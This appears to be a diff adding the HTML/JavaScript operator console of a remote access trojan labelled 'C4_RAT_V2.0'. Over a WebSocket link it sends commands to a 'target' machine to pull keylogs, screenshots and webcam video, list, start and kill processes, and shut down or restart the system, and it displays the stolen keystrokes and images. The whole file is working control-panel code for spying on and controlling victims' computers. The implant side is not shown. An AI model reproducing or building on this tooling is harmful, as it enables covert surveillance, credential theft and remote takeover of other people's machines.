@@ -1,0 +1,227 @@
+
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+    <meta charset='UTF-8'>
+    <title>⚡ C4 COMMAND CENTER ⚡</title>
+    <style>
+        /* --- CORE STYLE --- */
+        :root { --main-color: #0f0; --bg-color: #050505; --panel-bg: #0a0a0a; --danger: #ff3333; }
+        * { box-sizing: border-box; user-select: none; }
+        body { 
+            background-color: var(--bg-color); color: var(--main-color); 
+            font-family: 'Consolas', 'Courier New', monospace; 
+            margin: 0; padding: 20px; height: 100vh; overflow: hidden;
+            background-image: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            background-size: 100% 2px, 3px 100%;
+        }
+
+        /* --- LAYOUT GRID --- */
+        .container {
+            display: grid; 
+            grid-template-columns: 300px 1fr 350px; 
+            grid-template-rows: 60px 1fr 200px;
+            gap: 15px; height: 100%;
+        }
+        
+        /* --- PANELS --- */
+        .panel { 
+            border: 1px solid var(--main-color); 
+            background: rgba(0, 20, 0, 0.3);
+            padding: 15px; position: relative;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
+        }
+        .panel::before { content: ''; position: absolute; top: 0; left: 0; width: 10px; height: 10px; border-top: 2px solid var(--main-color); border-left: 2px solid var(--main-color); }
+        .panel::after { content: ''; position: absolute; bottom: 0; right: 0; width: 10px; height: 10px; border-bottom: 2px solid var(--main-color); border-right: 2px solid var(--main-color); }
+        
+        h2 { margin: 0 0 15px 0; font-size: 18px; border-bottom: 1px dashed var(--main-color); padding-bottom: 5px; text-transform: uppercase; letter-spacing: 2px; }
+
+        /* --- HEADER --- */
+        .header { grid-column: 1 / -1; display: flex; align-items: center; justify-content: space-between; border-bottom: 2px solid var(--main-color); }
+        .logo { font-size: 24px; font-weight: bold; text-shadow: 0 0 10px var(--main-color); }
+        .status-bar { font-size: 14px; }
+        
+        /* --- INPUTS & BUTTONS --- */
+        input { 
+            background: #000; border: 1px solid #333; color: #fff; padding: 8px; width: 100%; 
+            font-family: monospace; outline: none; margin-bottom: 10px;
+        }
+        input:focus { border-color: var(--main-color); }
+
+        button {
+            background: linear-gradient(180deg, #111, #000); 
+            color: var(--main-color); border: 1px solid var(--main-color);
+            padding: 10px; width: 100%; margin-bottom: 8px; cursor: pointer;
+            font-family: monospace; font-weight: bold; text-transform: uppercase;
+            transition: 0.2s; position: relative; overflow: hidden;
+        }
+        button:hover { background: var(--main-color); color: #000; box-shadow: 0 0 15px var(--main-color); }
+        button:active { transform: scale(0.98); }
+        
+        button.danger { border-color: var(--danger); color: var(--danger); }
+        button.danger:hover { background: var(--danger); color: #fff; box-shadow: 0 0 15px var(--danger); }
+
+        /* --- LOG TERMINAL --- */
+        .log-panel { grid-column: 1 / -1; overflow: hidden; display: flex; flex-direction: column; }
+        #log { 
+            flex: 1; overflow-y: scroll; font-size: 13px; line-height: 1.4; 
+            padding-right: 5px; color: #ccc; 
+        }
+        #log::-webkit-scrollbar { width: 5px; }
+        #log::-webkit-scrollbar-thumb { background: var(--main-color); }
+        .log-time { color: #666; margin-right: 10px; }
+        .log-sys { color: #ffff00; }
+
+        /* --- MEDIA AREA --- */
+        #media-view { width: 100%; height: 250px; background: #000; border: 1px dashed #333; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        img, video { max-width: 100%; max-height: 100%; border: 1px solid var(--main-color); }
+
+        /* --- APP LIST TABLE --- */
+        table { width: 100%; border-collapse: collapse; font-size: 12px; margin-top: 10px; }
+        th { text-align: left; border-bottom: 1px solid var(--main-color); color: #fff; }
+        td { padding: 4px 0; border-bottom: 1px solid #333; }
+        tr:hover { background: rgba(0, 255, 0, 0.1); cursor: crosshair; }
+
+        /* --- SCANLINE ANIMATION --- */
+        .scanline {
+            width: 100%; height: 100px; z-index: 10;
+            background: linear-gradient(0deg, rgba(0,0,0,0) 0%, rgba(0, 255, 0, 0.04) 50%, rgba(0,0,0,0) 100%);
+            opacity: 0.1; position: absolute; bottom: 100%;
+            animation: scanline 10s linear infinite; pointer-events: none;
+        }
+        @keyframes scanline { 0% { bottom: 100%; } 100% { bottom: -100%; } }
+    </style>
+</head>
+<body>
+    <div class='scanline'></div>
+    <div class='container'>
+        <div class='panel header'>
+            <div class='logo'>☠️ C4_RAT_V2.0 ☠️</div>
+            <div class='status-bar'>TARGET STATUS: <span id='status' style='color:red'>DISCONNECTED</span></div>
+        </div>
+
+        <div class='panel'>
+            <h2>CONNECTION</h2>
+            <input type='text' id='ip' value='127.0.0.1' placeholder='TARGET IP'>
+            <button onclick='connect()'>[ INITIALIZE UPLINK ]</button>
+            
+            <h2 style='margin-top:20px'>TARGET INFO</h2>
+            <div id='target-info' style='font-size:12px; color:#888'>Waiting for connection...</div>
+        </div>
+
+        <div class='panel'>
+            <h2>COMMAND MODULE</h2>
+            <div style='display: grid; grid-template-columns: 1fr 1fr; gap: 10px;'>
+                <button onclick="send('LIST_APP')">📂 PROCESS LIST</button>
+                <button onclick="send('KEYLOG')">⌨️ GET KEYLOG</button>
+                <button onclick="send('SCREENSHOT')">📸 SCREENSHOT</button>
+                <button onclick="send('WEBCAM')">🎥 WEBCAM (10s)</button>
+            </div>
+
+            <h2 style='margin-top: 20px'>PROCESS CONTROL</h2>
+            <div style='display:flex; gap:5px'>
+                <input id='appName' placeholder='App Name (notepad)' style='margin:0'>
+                <button onclick="startApp()" style='width:auto'>EXEC</button>
+            </div>
+            <div style='display:flex; gap:5px; margin-top:5px'>
+                <input id='killId' placeholder='PID to Kill' style='margin:0'>
+                <button onclick="killApp()" class='danger' style='width:auto'>KILL</button>
+            </div>
+        </div>
+
+        <div class='panel'>
+            <h2>VISUAL FEED</h2>
+            <div id='media-view'><span style='color:#333'>NO SIGNAL</span></div>
+            
+            <h2 style='margin-top:20px; color:var(--danger); border-color:var(--danger)'>POWER OPS</h2>
+            <button class='danger' onclick="if(confirm('CONFIRM SHUTDOWN?')) send('SHUTDOWN')">💀 SHUTDOWN REMOTE</button>
+            <button class='danger' onclick="if(confirm('CONFIRM RESTART?')) send('RESTART')">🔄 RESTART SYSTEM</button>
+        </div>
+
+        <div class='panel log-panel'>
+            <h2>SYSTEM LOGS</h2>
+            <div id='log'>Initializing system... Ready for input.</div>
+        </div>
+    </div>
+
+    <script>
+        let ws;
+        const logBox = document.getElementById('log');
+
+        function log(msg, type='SYS') { 
+            let time = new Date().toLocaleTimeString();
+            let color = type === 'ERR' ? 'red' : (type === 'KLOG' ? '#00ffff' : '#fff');
+            logBox.innerHTML += `<div><span class='log-time'>[${time}]</span> <span style='color:${color}'>${msg}</span></div>`;
+            logBox.scrollTop = logBox.scrollHeight; 
+        }
+
+        function connect() {
+            let ip = document.getElementById('ip').value;
+            let url = 'ws://' + ip + ':8080';
+            log('Initiating handshake protocol with ' + url + '...', 'SYS');
+            
+            try {
+                ws = new WebSocket(url);
+                ws.onopen = function() {
+                    document.getElementById('status').innerText = 'ONLINE / CONNECTED';
+                    document.getElementById('status').style.color = '#0f0';
+                    document.getElementById('target-info').innerHTML = 'Link established.<br>Protocol: WebSocket<br>Encryption: None';
+                    log('>> CONNECTION ESTABLISHED. ACCESS GRANTED.', 'SYS');
+                };
+                ws.onclose = function() {
+                    document.getElementById('status').innerText = 'OFFLINE / LOST';
+                    document.getElementById('status').style.color = 'red';
+                    log('>> CONNECTION LOST.', 'ERR');
+                };
+                ws.onerror = function() { log('>> CONNECTION ERROR. Check IP or Firewall.', 'ERR'); };
+                
+                ws.onmessage = function(e) {
+                    let d = e.data;
+                    if(d.startsWith('IMG|')) {
+                        document.getElementById('media-view').innerHTML = `<img src='data:image/jpeg;base64,${d.substring(4)}'>`;
+                        log('Received Screenshot data.', 'SYS');
+                    }
+                    else if(d.startsWith('VID|')) {
+                        document.getElementById('media-view').innerHTML = `<video controls autoplay loop src='data:video/avi;base64,${d.substring(4)}' style='width:100%'></video>`;
+                        log('Received Webcam stream.', 'SYS');
+                    }
+                    else if(d.startsWith('KEYLOG|')) {
+                        log('>> INCOMING KEYSTROKES:', 'KLOG');
+                        log(d.substring(7), 'KLOG');
+                    }
+                    else if(d.startsWith('LIST_APP|')) {
+                        renderList(d.substring(9));
+                        log('Process list updated.', 'SYS');
+                    }
+                    else log(d, 'SYS');
+                };
+            } catch(e) { log('Critical Error: ' + e, 'ERR'); }
+        }
+
+        function send(c) { 
+            if(ws && ws.readyState==1) {
+                ws.send(c); 
+                log('Command sent: ' + c, 'SYS');
+            } else {
+                alert('ERROR: Uplink not established.');
+                log('Failed to send command. No connection.', 'ERR');
+            }
+        }
+
+        function startApp() { send('START|'+document.getElementById('appName').value); }
+        function killApp() { send('KILL|'+document.getElementById('killId').value); }
+
+        function renderList(d) {
+            let h = '<table><tr><th>PID</th><th>PROCESS NAME</th></tr>';
+            d.split(';').forEach(r=>{ 
+                if(r) { 
+                    let p=r.split(','); 
+                    h+=`<tr><td style='color:#0f0'>${p[0]}</td><td>${p[1]}</td></tr>`; 
+                }
+            });
+            logBox.innerHTML += h + '</table><br>';
+            logBox.scrollTop = logBox.scrollHeight;
+        }
+    </script>
+</body>
+</html>
